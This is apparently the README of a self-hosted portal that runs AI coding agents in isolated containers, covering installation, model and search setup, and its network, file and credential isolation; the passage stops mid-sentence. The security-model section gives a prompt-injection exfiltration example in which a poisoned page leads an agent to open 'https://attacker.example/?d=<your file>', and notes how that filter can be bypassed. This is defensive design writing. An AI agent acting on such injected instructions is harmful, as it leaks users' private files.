# Workspace Portal

A private web portal that gives every user their own AI coding workspace: a container running the agent
they choose, the [Qwen Code](https://github.com/QwenLM/qwen-code) Web Shell (`qwen serve`) or the
DeepSeek Harness web UI (`dsh`), with a shell, files, a headless browser, web search and a page reader, all
driven by a model you host.

- Username/password sign-in. One admin creates the users (first, middle and last name).
- **Two workspaces per user, one running at a time.** **Private** has no internet access of its own, for
  sensitive work; **Online** reaches the public internet, for work that needs it (installing packages, testing
  against a CDN or an API). The user chooses one at every Start. The two share nothing: not files, accounts,
  networks or browser storage, so what runs in Online can't touch the Private files.
- **One container per user**, shared by all of that user's sign-ins (two browsers, two devices: same workspace).
- **One harness per user.** Each user picks Qwen Code or DeepSeek Harness in Settings (Qwen Code by default)
  and presses Start; both work on the same files (of the workspace that runs). Every new session starts at
  low reasoning effort; the user can raise it inside that session.
- It starts when the user presses Start and confirms Private or Online. It stops when the user signs out, or
  after 30 minutes without use, **but
  never while the agent is working**. A long task keeps running after the user leaves, and the workspace stops
  once the task is done.
- The admin sees every workspace's state and can open any of them, even while the user is in it.
- **Live monitoring and updates** for the admin: both servers' CPU, GPU, memory, bandwidth, power, network and
  disks twice a second, their energy use per day with its cost, every LLM session's read and write speed, and
  one-click updates of the agents and of the LLM engine (gufo), with automatic rollback.
- **Locked down by default:** a Private workspace can reach one address, the portal's gateway, which gives it
  the model, web search and a reader for public web pages. It has no internet access of its own. An Online
  workspace reaches the gateway and the public internet (any TCP port, DNS through two public resolvers).
  Neither can reach your LAN, the host or another workspace, and each has nothing mounted except that
  workspace's own files. The admin can turn Online off per user or for the whole portal.

```
 browser ──:3000──▶ web (Next.js)  ── sign-in, admin console, starts/stops workspaces
    │                   │ control API (127.0.0.1:4002)
    ├──:3100+id──▶ gateway ────────── Docker ──▶ wp-ws-<id>  Private (Qwen Code or DeepSeek Harness)
    └──:3300+id──▶   │  ▲                     ─▶ wp-wo-<id>  Online, or this one: one per user at a time
                     │  ├─ 172.29.0.1:4001 ◀── Private: the only address it can reach
                     │  └─ 172.28.0.1:4001 ◀── Online: this, and the public internet (TCP, DNS) through NAT
                     ├─ /llm/v1    ──▶ LLM_UPSTREAM_URL (your model server)
                     └─ /mcp/search ─┬▶ searxng container (public search engines: web_search)
                                     └▶ reader container  (public web pages: read_page)
```

## Contents

- [Security model](#security-model)
- [Requirements](#requirements)
- [Install and start the web server](#install-and-start-the-web-server)
- [Connect the model](#connect-the-model)
- [Web search](#web-search)
- [The page reader](#the-page-reader)
- [The agents: Qwen Code and DeepSeek Harness](#the-agents-qwen-code-and-deepseek-harness)
- [Agent settings for all workspaces](#agent-settings-for-all-workspaces)
- [Server monitoring and LLM engine updates](#server-monitoring-and-llm-engine-updates)
- [Updating the portal](#updating-the-portal)
- [Updating the workspace images](#updating-the-workspace-images)
- [Using it](#using-it)
- [Remote access with Tailscale](#remote-access-with-tailscale)
- [Operations](#operations)
- [Development](#development)
- [Limitations](#limitations)
- [License](#license)

## Security model

Each item is enforced by the gateway or the host, not by the agent. `deploy/verify-isolation.sh` checks the
network and container items on a live install.

**Two workspaces per user**
- Every user has a Private and an Online workspace, and at most one of them runs. Each has its own folder,
  its own UID (`WORKSPACE_UID_BASE + N` and `ONLINE_UID_BASE + N`), its own container, network, browser
  origin and token, and its own listener at the gateway. Neither can see the other's files, reach the other's
  container, or read what the other left in the browser. Files reach the other kind only if the user carries
  them over (download from one, upload to the other).
- Online is meant for less sensitive work: anything in it that is misconfigured or compromised can send its
  files to the internet. Private is for the rest.

**Network of a Private workspace: one address, three services**
- Private workspaces sit on a Docker *internal* network: Docker gives it no route off the host. There is no
  DNS for internet names, no NAT and no IPv6.
- Inter-container traffic is disabled, so a workspace can't reach another workspace.
- The one address a workspace can reach is the host side of that network (`172.29.0.1`). A host firewall
  (`deploy/firewall.sh`: an nftables table of its own, `inet workspace_portal`, loaded at boot by
  `workspace-portal-firewall.service`) drops every connection from the workspace network except the one to
  the gateway's service port. SSH, the portal, the LLM server and SearXNG on the host are all unreachable,
  and nothing from the workspace network is forwarded anywhere. A drop in nftables is final, so rules that
  Docker, firewalld or Tailscale add elsewhere can't reopen it. Docker requires that unit: should the rules
  fail to load at boot, Docker and every container stay down rather than run without them.
- On that port the gateway serves only:
  - the model: chat completions, completions, embeddings and the model list under `/llm/v1/`, forwarded to
    `LLM_UPSTREAM_URL` with your real API key added (any other path of the model server is refused);
  - web search: an MCP `web_search` tool that sends the query to the stack's own SearXNG and returns titles,
    links and snippets;
  - page reading: an MCP `read_page` tool that returns the text of one public web page or PDF.

  There is no proxy: the workspace never holds a connection to the internet. `read_page` is the one way
  something an agent names is fetched, so it is fenced in twice:
  - The gateway decides *which* pages. By default an agent may open a URL it was shown (in its search
    results, on a page it read, or in its conversation: what you typed and what its tools printed) and
    anything on a short list of documentation and code sites. A URL the model put together itself is
    refused, and so is anything it adds to a URL it was shown: the page is requested exactly as it was
    shown. That is the usual way a poisoned page gets an agent to leak data: "open
    `https://attacker.example/?d=<your file>`". This is a filter, not a wall: an agent that is talked into
    printing such a URL through a tool and then opening it gets past it. `READER_URL_POLICY=any` turns the
    rule off.
  - The reader decides *where* it connects, and this part is a wall. It is a container of its own with no
    secrets, volumes or capabilities. It reads only `http`/`https` on ports 80 and 443 at public IPv4
    addresses, connects to the very address it checked (so a name can't change between the check and the
    connection), checks every redirect the same way, sends no cookies, and caps time, size and output. The
    host firewall enforces the same from outside: from the reader's network only public addresses on 80
    and 443 and its two DNS servers are reachable, so not the host, your LAN, the LLM server, a metadata
    address or a workspace.

  SearXNG, which sends the queries on to public search engines, is held the same way from outside: an
  unprivileged container with a read-only root, no capabilities and no volumes, on a network of its own
  with the same firewall rules. It and the reader are on separate networks and cannot reach each other.
- The agents' own internet features are off, and users can't turn them back on:
  - Qwen Code, pinned at system scope: auto-update, usage statistics, telemetry and the model catalogue
    refresh are off, `web_fetch` is denied, and the built-in web search providers are removed.
  - DeepSeek Harness, by a lockdown patch in the image that applies after the user's own settings, and by
    agent presets adapted in the image: no DeepSeek account or DeepSeek model routes, no built-in web fetch
    or web search, no plugin manager or market, no feedback upload, and telemetry off.

  With them off, a running Qwen Code workspace made no outside DNS lookups in testing. In a DeepSeek
  Harness workspace the only ones came from the headless browser's Chromium asking for Google hosts; Docker's
  resolver answers those with a failure and nothing leaves the host.

**Network of an Online workspace: the public internet, nothing private**
- Online workspaces sit on a network of their own (`172.28.0.0/16`, bridge `br-wonline`) with NAT to the
  internet, inter-container traffic off and no IPv6.
- The host firewall's chains for it: to the host, only the gateway's service port on that network's address
  (`172.28.0.1`); out, DNS to its two resolvers (`ONLINE_DNS_1`, `ONLINE_DNS_2`, public ones: the gateway and
  the installer refuse others) and new TCP connections to any port of a public address. Every private,
  link-local, carrier-NAT and other reserved range is dropped: your LAN, the host's other addresses, the
  Private network, SearXNG, the reader and the other Online workspaces are all out of reach. So are, even at
  public addresses, the networks this host is on, its router, the LLM server and the other servers the portal
  talks to (portal-hostd, an outside SearXNG or reader) and anything in `FIREWALL_NEVER_REACH`: the installer
  resolves them into the firewall's `never` set (re-run it when one of them changes address). Those drops come
  before DNS is let through. No other UDP, no ICMP of its own, and nothing can open a connection to it from
  outside.
- The gateway runs Online workspaces only while those rules are loaded. It checks every few seconds (and
  right before each start) with a marker the rules carry; without them it refuses Online starts and stops
  every Online workspace, and Private ones run on.
- The gateway gives it the same service port as a Private one (the model, `web_search`, `read_page`), with
  its own state: what an Online workspace was shown never opens a page for the Private one. The agents'
  internet features stay off as in Private; the agent reaches the internet through its shell and tools.
- `ONLINE_WORKSPACES=off` in `.env` turns Online off for everyone (the gateway then creates no Online network
  and stops any Online workspace it finds); the admin can also refuse it per user.

**Files: only the workspace's own**
- User N's Private workspace runs as its own UID (`WORKSPACE_UID_BASE + N`, 200000+N by default), the Online
  one as another (`ONLINE_UID_BASE + N`, 2000000000+N). Each UID owns two directories, that workspace's home and
  workspace, and nothing else on the host; no `/etc/subuid` range may cover it (the installer refuses that, and
  `verify-isolation.sh` checks it again, with the folders' owners and modes). Only user ids below
  `AGENT_PORT_COUNT` get a workspace at all.
- The container's root filesystem is read-only. Writable are `/home/user`, `/workspace` (the user's storage)
  and an in-memory `/tmp`.
- The rest is mounted read-only and is a per-user copy:
  - the running agent's settings (`/etc/workspace-portal/qwen/` or `/etc/workspace-portal/dsh/`);
  - `/etc/passwd` and `/etc/group`.

  No directory, socket or file is shared between workspaces, not even between a user's two.
- A workspace gets files only two ways: uploads into its own storage, and what the agent produces from the
  model and search results.

**Privileges**
- All capabilities are dropped, with no-new-privileges and memory, CPU and PID limits. The image has no
  setuid or setgid programs and no user accounts of its own.
- `tini` runs as PID 1, and the OOM killer picks workspaces before the LLM server.
- The default seccomp profile applies, plus SELinux confinement on Fedora/RHEL.

**Credentials**
- The LLM API key and SearXNG credentials stay in the gateway; a workspace sees a placeholder key. Each of
  the portal's containers gets only the settings it uses: the web app never sees those credentials, the
  gateway never sees the admin password, the page reader gets no secret at all, and SearXNG gets only the
  key it signs its own cookies with.
- Each container start gets a fresh random credential for its agent. It lives only in the gateway and in
  that container.
  - Qwen Code: the browser gets a different token, derived from its portal session and that one workspace.
    The gateway accepts it only together with the session cookie, and swaps it for the container's token.
  - DeepSeek Harness: the credential is the secret dsh signs its login cookie with. The browser never holds
    a dsh cookie: the gateway signs a short-lived one for each request it forwards, after its own session
    checks. Inside the container, the secret is in a file under `/tmp` and in no process's environment.
- Sessions use an HttpOnly, SameSite=Lax cookie; passwords are hashed with Argon2id. Five failed sign-ins
  lock an account for 15 minutes.

**Browser isolation**
- Every workspace is served on its own port (`AGENT_PORT_BASE + user id` for Private,
  `ONLINE_AGENT_PORT_BASE + user id` for Online), so it is a separate browser origin. Its storage, service
  worker and scripts can't see another workspace, even in the same browser: a page the agent built in Online,
  with whatever scripts it loads, can't read the Private one's. Each port reaches only its own kind's
  container, with a browser token of its own.
- The ports of one host are one *site* to the browser, so it sends the portal's session cookie along with
  whatever a page on another port asks of a workspace's port. The gateway refuses every such request but the
  portal's own frame of the workspace: a page on the Online origin can't get as much as an image request
  through to the Private agent.
- A session can use only the workspace it has open. An admin's session can use another user's workspace only
  after opening it from the admin console, which writes to the audit log.

**Inside the workspace**
- Qwen Code starts each Web Shell session in Plan mode: until the user approves its plan, the agent only
  reads, and anything else needs the user's approval. Its commands and edits then go through the session's
  approval mode: by default Classifier Approval (a model call approves safe tool calls and blocks or asks
  about risky ones); the user can pick Ask Approval or a more permissive mode.
- DeepSeek Harness runs the agent's commands in a Landlock sandbox. Without asking, they may write only
  `/workspace`, `/tmp` and the home directory's caches. Anything else, including dsh's own settings and shell
  start-up files, needs the user's approval. The terminal in the UI is the user's own and is not sandboxed.
- Either way the container is the boundary: whatever runs inside it has the limits above.

**What the admin can do:** read and use every workspace, of both kinds, and erase a kind's files. That is by
design, and audited.

## Requirements

- Linux with Docker Engine 25.0.5 or newer and the compose plugin, `nftables` (the `nft` command), `python3`,
  `openssl`, `curl`. Tested on Fedora 44 with Docker 29. Older Docker engines let containers on internal
  networks resolve internet names (CVE-2024-29018), so the installer and the gateway refuse them.
- An OpenAI-compatible model server (llama.cpp, vLLM, Ollama, a hosted API). It runs anywhere the server can reach.
- Internet access from the server, for web search and page reading (without it both tools answer with an
  error; everything else works).
- RAM: about 0.5 GB per idle workspace and up to `WORKSPACE_MEMORY` (3 GB) under load, plus about 0.4 GB for
  the portal's own containers.

## Install and start the web server

```sh
git clone <this repository> workspace-portal
cd workspace-portal
sudo bash deploy/install.sh
```

The installer is idempotent; re-run it after pulling changes (see [Updating the portal](#updating-the-portal)).
It:

1. checks the host: Docker version, `nft`, and that the workspace UIDs of both kinds don't overlap a range in
   `/etc/subuid`, and checks the Online settings (ports and UIDs apart from Private's, addresses, the switch);
2. creates `.env` from `.env.example` (mode 600), generating `GATEWAY_CONTROL_SECRET` and an `ADMIN_PASSWORD`,
   and records the host's time zone as `TZ` (the daily totals begin at local midnight);
3. creates `PORTAL_DATA_DIR` (`/srv/workspace-portal`) with the ownership model above, plus the SELinux labels;
4. installs the example Qwen Code settings into `PORTAL_DATA_DIR/config/qwen/` (never overwriting yours);
5. builds a workspace image for each agent in `WORKSPACE_AGENTS` at its current version (`QWEN_CODE_VERSION`,
   `DSH_VERSION` until an admin picks another; a few minutes each the first time) and the web, gateway,
   SearXNG and page reader images;
6. installs and starts the firewall unit (both workspace networks, SearXNG and the page reader), and opens
   ports 3000, 3101–3299 (Private workspaces), 3301–3499 (Online), 4101–4299 and 4301–4499 (the apps running
   in them, for the Web preview) to your LAN (and to Tailscale, if present) in firewalld or ufw;
7. checks that no other program holds the two loopback ports the stack publishes (SearXNG's and the
   reader's), generates SearXNG's key, starts the stack with `docker compose up -d`, waits for the web app,
   SearXNG and the reader to answer, and prints the URL.

From a development machine you can push and install in one step: `deploy/deploy.sh user@server`. It rsyncs
the tree, keeping the server's `.env` and nothing else: a file of the project that was changed on the server
(`searxng/settings.yml`, say) is replaced by yours.

Edit `.env` before the first install if you need different ports, paths or limits. Every variable is
documented in `.env.example`. Changing a port or a network setting (`WORKSPACE_*`, `ONLINE_*`, `READER_*` or
`SEARXNG_*` subnet, bridge or DNS server) later needs a re-run of the installer, which regenerates the
firewall from them; other settings need only `docker compose up -d`.

**Starting, stopping and restarting the web server.** Run these in the project directory on the server, with
sudo unless you are in the `docker` group:

```sh
docker compose up -d            # start (or apply .env changes)
docker compose restart          # restart the portal's containers; running workspaces keep running
docker compose down             # stop the portal; workspaces stay until the gateway stops them
docker compose ps               # status
docker compose logs -f web gateway
```

`docker compose restart` and `down` also act on SearXNG and the page reader; name the services to leave them
alone (`docker compose restart web gateway`).

The stack starts at boot (Docker is enabled by the installer). Open `http://<server>:3000` and sign in as
`admin`. The initial password is in `.env`:

```sh
grep ^ADMIN_PASSWORD .env
```

At that first sign-in the portal asks you to choose a new password. `ADMIN_PASSWORD` is only used to create
the admin account; changing the password in the portal doesn't update it.

## Connect the model

Workspaces talk to the gateway, and the gateway talks to your model server, so only the server needs to reach it.

1. Set the provider in `.env`:

   ```sh
   # Base URL WITHOUT /v1: the gateway forwards /v1/chat/completions etc. unchanged.
   LLM_UPSTREAM_URL=http://127.0.0.1:8080          # llama.cpp / vLLM on this host
   # LLM_UPSTREAM_URL=http://10.0.0.5:8000         # a model server elsewhere on your network
   # LLM_UPSTREAM_URL=https://api.example.com      # a hosted OpenAI-compatible API
   LLM_API_KEY=                                    # sent as "Authorization: Bearer …"; empty for none
   LLM_MAX_CONCURRENCY=3                           # match the server's parallel slots
   LLM_MAX_CONCURRENCY_PER_USER=2
   ```

   For a provider whose base URL ends in `/v1` (for example `https://openrouter.ai/api/v1`), drop the `/v1`
   (`https://openrouter.ai/api`).

2. Choose the models users see, in both agents. They are listed under `modelProviders.openai` in Qwen Code's
   `system-defaults.json`, one entry per model: `id` is the name the model server expects (an `id` from
   `/v1/models`), and the entry also sets the display name, context window, output limit, image input,
   reasoning effort levels and sampling parameters. `model.name` picks the default. Start from
   `qwen-config/system-defaults.json`, which the installer has already put in place, and install your
   version as described in [Qwen Code settings](#qwen-code):

   ```sh
   cp qwen-config/system-defaults.json /tmp/system-defaults.json   # then edit "id", "name", limits, …
   sudo bash deploy/qwen-config.sh install /tmp/system-defaults.json
   ```

   The portal rewrites each entry's `baseUrl` to the gateway and its key to a placeholder, so leave them
   out and never put real keys there. A workspace won't start without at least one model.

   DeepSeek Harness offers the same models with the same default. It takes each model's id, name, context
   window, output limit, image input and reasoning effort levels, but not the sampling parameters: it has no
   setting for them, so the model server's defaults apply. Its context management needs
   `context window − output limit ≥ 78020` tokens, so it lowers a model's output limit to fit, and leaves
   out a model with a context window under 82116 tokens.

3. Apply the change:

   ```sh
   docker compose up -d     # after .env changes: restarts the gateway with the new provider
   ```

   Workspaces pick up model changes at their next start. Stop running ones in the admin console to apply now.

4. Check it from the server: `curl -s "$LLM_UPSTREAM_URL/v1/models"` should list your model. In a workspace,
   ask the agent anything. The gateway logs one JSON line per model request (`docker compose logs gateway`).

   If the chat shows `404 model '…' is not served`, the model `id` in `system-defaults.json` doesn't match an
   `id` from `/v1/models`. Fix it, then stop the workspace so it restarts with the new settings.
   A reply that never comes usually means the model server is busy with other requests: the gateway's
   `/control/stats` shows `llm.inFlight`, and the server's own log shows its queue.

## Web search

The agent's `web_search` tool is served by the gateway, which asks the stack's own SearXNG: the `searxng`
container, built from `searxng/` and started with everything else. There is nothing to install or connect.

- `searxng/Dockerfile` pins the SearXNG release, and `searxng/settings.yml` beside it holds the settings
  tested with that release. Both are part of the image, so the container has no volume and a change to either
  arrives with the next `sudo bash deploy/install.sh`.
- No API key and no account. Every search asks four engines (keenable, yahoo, yandex, metacrawler). Four more
  (duckduckgo, swisscows, privacywall, mojeek) are loaded but kept out of ordinary searches: the gateway
  asks them by name when a search finds almost nothing.
- Only the gateway reaches it, on `127.0.0.1:SEARXNG_PORT` (8888). It is an unprivileged container with a
  read-only root and no capabilities, on a network of its own from which the host firewall lets it reach
  public addresses on ports 80 and 443 and its two DNS servers, and nothing else: not the host, your LAN,
  the LLM server, a workspace or the page reader.
- Only the query text, page, time range and language are sent to SearXNG, and from there to the search
  engines. The workspace never contacts either.
- At every start SearXNG downloads the public ClearURLs list of tracking parameters (from
  `cdn.jsdelivr.net`, else `clearurls.xyz`) and strips those parameters from the links in its results.

Check it from the server. The first command must print `OK`, the second a number above zero:

```sh
curl -s http://127.0.0.1:8888/healthz
curl -s "http://127.0.0.1:8888/search?q=test&format=json" | python3 -c 'import json,sys; print(len(json.load(sys.stdin)["results"]))'
```

The settings in `.env`:

```sh
SEARXNG_PORT=8888                              # the loopback port SearXNG is published on
SEARXNG_TIMEOUT_SECONDS=20
SEARCH_MAX_CONCURRENT_PER_USER=2
SEARCH_FALLBACK_ENGINES=duckduckgo,swisscows,privacywall,mojeek   # asked by name when a search finds fewer than SEARCH_FALLBACK_BELOW results; "none": never
SEARCH_FALLBACK_BELOW=3
SEARCH_CACHE_MINUTES=15                        # the same search again is answered from memory
```

- Fallback engines are engines SearXNG has loaded but keeps out of ordinary searches (`disabled: true` in
  `searxng/settings.yml`). That way a spare engine is only asked when the main ones come back thin, and is
  not worn out (and blocked) by every query.
- When every engine fails, the agent is told which ones did not answer and that rewording will not help.
  Without that, a model takes "no results" as a bad query and retries it in ten spellings.
- SearXNG skips, without an error, every engine that has no paging when asked for page 2, and every engine
  that has no date filter when asked for one. Keep at least one engine with both among the ones that are
  always on, or those searches come back empty.

**Changing the engines.** Edit `searxng/settings.yml`, keep `SEARCH_FALLBACK_ENGINES` in `.env` in step with
the engines it marks `disabled: true`, and run `sudo bash deploy/install.sh`. Search engines block addresses
that send many queries in a short time, so test a change with a handful of searches, not a load test.
`sudo bash deploy/verify-isolation.sh` checks that SearXNG runs with these settings (the JSON format is
allowed and every fallback engine is loaded).

**A SearXNG of your own instead.** Set `SEARXNG_URL` in `.env` to its base URL as the server reaches it (it
may include a path prefix), and `SEARXNG_AUTHORIZATION` if it is behind auth (`Basic …` or `Bearer …`). Its
`settings.yml` must allow the JSON format (`search.formats: [html, json]`; a `403` from
`curl -s "$SEARXNG_URL/search?q=test&format=json"` means it does not), and its bot protection (`limiter`),
if on, must let the gateway's address through. Set `SEARCH_FALLBACK_ENGINES` to engines your instance has
loaded, or to `none`. Apply with `docker compose up -d`. The stack's own SearXNG keeps running, unused.

**Coming from a version without its own SearXNG.** A SearXNG you installed for it holds `127.0.0.1:8888`,
the port the portal's own now wants. Two ways:

- Switch to the portal's own: stop and disable yours, then run the installer. `.env` needs no change (the
  installer comments out the old `SEARXNG_URL` line, which named that address). Web search is down from the
  moment yours stops until the installer has finished. To keep that short, run the installer first: it
  builds everything, then stops without restarting anything and says which program holds the port. Stop
  yours then and run it again.
- Keep yours: set `SEARXNG_PORT` in `.env` to a free port and leave `SEARXNG_URL` pointing at yours.

To go back to a version without its own SearXNG, start yours again: that version expects one at
`SEARXNG_URL`, `http://127.0.0.1:8888` unless `.env` says otherwise.

## The page reader

`read_page` gives an agent the text of a public web page or PDF as markdown: the main content, without
menus and ads, with code blocks kept exactly as written. Long pages come in parts (20,000 characters by
default) and the agent asks for the next part when it wants more. The reader has no browser, so a page
that only appears with JavaScript, or a site that turns automated readers away, can't be read.

It runs as the `reader` container, started with the rest of the stack. Settings, all in `.env`:

```sh
#READER_URL=off                 # no read_page tool; agents get web_search only
READER_URL_POLICY=shown         # shown: only pages the agent was shown, plus trusted sites. any: every public page
#READER_TRUSTED_HOSTS=...       # sites open as a whole (subdomains included); default: a list of docs and code sites
READER_PAGE_CHARS=20000         # characters per call
READER_CACHE_MINUTES=15         # a page read again, or read on, is not downloaded again
READER_DNS_1=1.1.1.1            # the reader's DNS servers; must be public ones
READER_DNS_2=9.9.9.9
```

`.env.example` lists the rest (limits, port, network). After changing the network or DNS settings re-run
`sudo bash deploy/install.sh`, because the firewall is generated from them; for the others
`docker compose up -d` is enough.

What leaves your server when an agent reads a page: one GET request to that site from your public address,
with the user agent `WorkspacePortalReader`, and a DNS lookup of its name at the two DNS servers above.
The security model above explains how the reader is confined; `sudo bash deploy/verify-isolation.sh`
checks it on the live install.

## The agents: Qwen Code and DeepSeek Harness

`WORKSPACE_AGENTS` in `.env` lists the agents users can pick in Settings, in the order they are shown. The
first one is the default for users who haven't picked one:

```sh
WORKSPACE_AGENTS=qwen,dsh        # both (the default); qwen = Qwen Code, dsh = DeepSeek Harness
# WORKSPACE_AGENTS=qwen          # only Qwen Code
QWEN_CODE_VERSION=0.27.0         # the default versions (see "Updating the workspace images")
DSH_VERSION=0.2.2-rc.1
```

After a change, run `sudo bash deploy/install.sh`, which builds the image of a newly added agent. A workspace
still running an agent you removed keeps it until it stops; its next start uses the first enabled agent.

Both agents run in the same locked-down container with the same limits and see the same `/workspace` and
home directory, so switching agents keeps the user's files. Each keeps its own history: Qwen Code in
`~/.qwen`, DeepSeek Harness in `~/.dsh`. DeepSeek Harness 0.2 is a preview release; its UI says so.

## Agent settings for all workspaces

### Qwen Code

Every Qwen Code workspace starts `qwen serve` with two system settings files that the admin provides:

| File | Scope | Typical content |
|---|---|---|
| `settings.json` | **system**: overrides what users set | permissions, extra MCP servers, UI defaults, anything users must not change |
| `system-defaults.json` | **defaults**: users may change these in their own settings | `modelProviders`, the default `model`, reasoning effort |

Both are [Qwen Code settings files](https://qwenlm.github.io/qwen-code-docs/) (JSON; `//` comments allowed).
Start from the examples in `qwen-config/`.

**Upload** your files on the server; they are validated before they are installed:

```sh
sudo bash deploy/qwen-config.sh install /path/to/settings.json /path/to/system-defaults.json
sudo bash deploy/qwen-config.sh show      # what is installed
sudo bash deploy/qwen-config.sh check     # validate the installed files
```

They are stored in `PORTAL_DATA_DIR/config/qwen/` (root-owned; workspaces never see this directory).
You can upload one file or both; the name decides which is which.

**When they apply.** At every workspace start the gateway renders a private copy for that user and kind into
`PORTAL_DATA_DIR/users/<id>/<kind>/system/qwen/` (`<kind>` is `private` or `online`; the two copies differ
only in the gateway address) and mounts it read-only. New settings therefore apply at each workspace's next
start. To apply them right away, stop the running workspaces in the admin console; each user starts theirs
again from the portal. An invalid file makes starts fail with a message naming it, shown in the
portal and in `docker compose logs gateway`.

**What the portal always enforces** on top of your files, because the isolation depends on it:

- `mcpServers.search`: the portal's web search and page reader. With `WORKSPACE_BROWSER=true`, also `mcpServers.browser`
  (headless Chromium inside the workspace). Your other MCP servers are kept. Stdio servers run inside the
  workspace; HTTP servers elsewhere are unreachable.
- `modelProviders.openai[*].baseUrl` goes to the gateway, `envKey` to a placeholder, and `apiKey` is removed.
  Only OpenAI-compatible providers are kept.
- `security.auth.enforcedType` and `selectedType`: `openai`.
- Off: `general.enableAutoUpdate`, `general.preventSystemSleep`, `privacy.usageStatisticsEnabled`,
  `telemetry.enabled`, `model.catalogRefresh`.
- `permissions.deny` includes `web_fetch` (Qwen Code's own fetch tool, which would need internet access;
  pages are read with the portal's `read_page`), and `tools.webSearch` (built-in providers) is removed.

Users keep their own Qwen Code settings, chats and memory in their home directory, which survives restarts.

**Reasoning effort.** Every model starts at `DEFAULT_REASONING_EFFORT` (`low` unless set in `.env`) in every
new session, whatever a user picked last time; a user who raises it does so for that session only. A
`model.reasoningEffort` in your `settings.json` (system scope) wins over this default.

**The Web Shell, trimmed** (built into the image by `workspace-image/qwen/trim-web-shell.mjs`, since Qwen Code
has no settings for it):

- The left rail keeps Home and the sidebar toggle. Gone: Activity, Plugins, Channels, Channel events, Live,
  Scheduled Tasks, PR watches, Goals and the "More" menu (with the Web Shell's own Settings page, Session
  Overview, Split View, Daemon Status, Local files and Use this computer). The chat header loses Mobile access.
  Files, Terminal and Web preview stay in the right panel.
- The **Web preview** shows the apps running in the workspace. It loads in the user's own browser, where
  `http://localhost:3000` would be the user's own computer, so `localhost`, `127.x.x.x` and `0.0.0.0` addresses
  go to the workspace instead: the gateway serves its port 3000 (any port from 1024) on the workspace's preview
  port, 1000 above its own (`/__portal/port/3000/`). The app's server must listen on all addresses (`0.0.0.0`;
  Vite needs `--host`). Its frame may lock the pointer (games) and show dialogs. A Private workspace's app may
  load nothing from outside its preview address. Internet
  sites show only when they allow being framed (Google doesn't): **Open externally** opens them in a tab.
- Every new session starts with **Plan mode** on: the agent plans first and works only after the user approves
  the plan, then in the approval mode the composer shows. A user can switch it off for a session in the
  composer's + menu. This is the Web Shell only: `qwen` in the terminal and `qwen -p` start as before.

When a Qwen Code version no longer fits a part of this, the image still builds and that part stays as shipped;
the build log says which (`trim-web-shell: warning: ...`). The rail and header items are also hidden by a
stylesheet keyed on the Web Shell's markup, which outlasts most changes. A change to the script applies at the
next build: rebuild the current version with `sudo bash deploy/update-image.sh qwen --refresh` or in Admin >
Updates.

### DeepSeek Harness

DeepSeek Harness takes its models from the same files (see [Connect the model](#connect-the-model)), with
the portal's search and browser tools. Everything else is fixed by the portal, in two patches applied after
the user's own settings, so the UI shows those settings as read-only:

- `workspace-image/dsh/lockdown.patch.yml`, built into the image: the internet features above off, the
  sandbox and approvals, one workspace (`/workspace`). To change it, edit the file and rebuild with
  `sudo bash deploy/update-image.sh dsh --refresh`. The image build also switches off the web and plugin
  manager tools inside dsh's own agent presets (`workspace-image/dsh/adapt-presets.mjs`), so all four
  (Standard, PTC, Minimal, Cordis) work offline.
- `portal.patch.yml`, rendered by the gateway at every start into `PORTAL_DATA_DIR/users/<id>/<kind>/system/dsh/`:
  the models, the default model and the MCP servers.

Users keep their own sessions, settings and skills in `~/.dsh` and `~/.agents`.

## Server monitoring and LLM engine updates

A small daemon, `portal-hostd` (Python standard library only, in `hostd/`), runs on each server. It reads the
hardware only while an admin has Admin > Usage open, at about 1 ms of CPU per reading. All the time it keeps
only a running total of energy and network traffic (one read every 2 s, under 0.05% of one core), from which
the gateway records each server's energy use and traffic per day. On the LLM server it also updates the
engine container (the gufo quadlet) when the admin asks. Details: [hostd/README.md](hostd/README.md).

- **Portal server:** `deploy/install.sh` installs it and its token by itself. It listens on 127.0.0.1 only.
- **LLM server:** install it there once, from a copy of this repository:

  ```sh
  git clone <this repository> workspace-portal
  sudo bash workspace-portal/hostd/install.sh llm --portal PORTAL_IP
  ```

  It opens its port (9180) to the portal's address only and prints two lines. Add them to the portal's `.env`
  and restart the stack:

  ```sh
  HOSTD_LLM_URL=http://LLM_SERVER_IP:9180
  HOSTD_LLM_TOKEN=...
  ```

  ```sh
  sudo docker compose up -d
  ```

**Admin > Usage** then shows, twice a second: each server's total power draw, CPU and GPU usage, clocks,
temperatures and power, memory used and free, memory bandwidth and fans, network upload and download (and the
day's totals), disk read and write and the free space; the LLM's total read speed (prompt tokens per second)
and write speed (answer tokens per second), each charted over the last minute; and every workspace session (a
run from Start to its stop), with what the LLM is doing for it now and what its requests added up to: requests,
average read and write speed, tokens in and out, time on the LLM, the average power draw of its share of the LLM
server's energy, and that energy's cost. Readings a machine can't provide show "—". On a wide screen the sessions and both servers sit side by side.

**Admin > Energy** keeps both servers' energy per day, for good, with its cost at the published electricity price
of the place the admin picks under **Settings > Electricity price** (EIA's monthly residential average for US
states, Eurostat's half-yearly household price for European countries; the gateway downloads both, no key
needed). The energy is what each server's own sensor reports, not a reading at the wall.

**Admin > Users** lists the running workspaces under the users, every 5 seconds: kind, harness, status, memory,
LLM requests and how many have it open.

**Admin > Updates > LLM engine** lists the engine's latest five releases and the images on the LLM server, each
with its release notes ("Breaking changes" marked), and switches to any of them in three steps: download its
image (unless it is on the LLM server already), wait for running LLM requests to finish (new ones wait in the
portal's queue, they don't fail; up to `ENGINE_DRAIN_MINUTES`, 15, or "Restart now"), then restart the engine and
check that it reports that version. If it doesn't come up, the previous version is restored by itself. Going back
to an older version works the same way, and images that don't run can be removed. Without `HOSTD_LLM_*` the page
says how to set it up; updating by hand on the LLM server still works as before.

## Updating the portal

Everything the stack runs is built from this repository: the web app, the gateway, the page reader,
SearXNG with its settings, the firewall and the recipes of the workspace images. One update brings all of
it:

```sh
cd workspace-portal
git pull --ff-only
sudo bash deploy/install.sh
sudo bash deploy/verify-isolation.sh
```

- The installer rebuilds what changed, reloads the firewall and replaces the containers whose image or
  settings changed. `.env`, the agent settings in `PORTAL_DATA_DIR/config` and all user data are kept. A
  setting that is new in `.env.example` needs no line in your `.env`: the default shown there applies.
- Running workspaces keep running, and the gateway takes them over when it is back; open browser pages
  reconnect by themselves. A request to the model that is in flight at that moment is cut off, so update
  when no agent is working (the admin console shows which workspaces are).
- A workspace keeps the image it started with. It gets a rebuilt image at its next start.
- `verify-isolation.sh` must end with `failed 0`.
- **From a version before Online workspaces:** every user's files become their Private workspace. The
  gateway moves `users/<id>/home` and `workspace` into `users/<id>/private/` (a rename: nothing is copied,
